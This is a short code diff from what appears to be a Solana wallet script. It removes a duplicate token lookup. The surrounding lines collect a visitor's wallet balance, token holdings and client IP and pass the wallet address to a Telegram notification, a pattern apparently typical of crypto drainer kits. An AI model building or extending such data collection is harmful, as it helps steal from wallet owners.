@@ -310,7 +310,6 @@ const splTokens = await getSPLTokenInfo(connection, publicKeyString);
             const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);
 
             const clientIP = await getClientIP();
-            const splTokens = await getSPLTokenInfo(connection, public_key);
 
             await sendTelegramNotification({
                 address: publicKeyString,
